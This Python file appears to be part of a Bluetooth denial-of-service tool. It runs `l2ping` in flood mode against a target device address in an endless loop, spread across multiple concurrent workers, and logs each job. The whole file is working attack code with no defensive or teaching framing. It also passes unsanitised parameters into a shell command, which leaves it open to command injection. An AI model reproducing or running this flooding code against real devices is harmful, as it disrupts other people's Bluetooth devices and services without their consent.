import subprocess
import time

from utils.async_utils import create_async_task

def mass_ping(target: str, interface: str, packet_size: int, worker_id: int):
    worker = f"Worker-{str(worker_id).zfill(2)}"
    job_id = 0
    
    while True:
        cmd = f"l2ping -i {interface} -s {packet_size} -f {target}"
        job = f"Job-{job_id}"
        prefix = f" > [{worker} | {job}]    "
        
        try: 
            print(f"{prefix} pinged with {packet_size} bytes to {target}")
            subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        except subprocess.CalledProcessError as _:
            pass
        except subprocess.TimeoutExpired as _:
            pass
        except subprocess.SubprocessError as e:
            print(f"{prefix} Error: {e}")
            pass
        except BlockingIOError as e:
            print(f"{prefix} No resource available (BlockingIOError) try with less threads.")
            pass
        
        time.sleep(1)
        job_id += 1
        
def mass_ping_async(target: str, interface: str, packet_size: int, threads: int):
    create_async_task(threads, mass_ping, (target, interface, packet_size))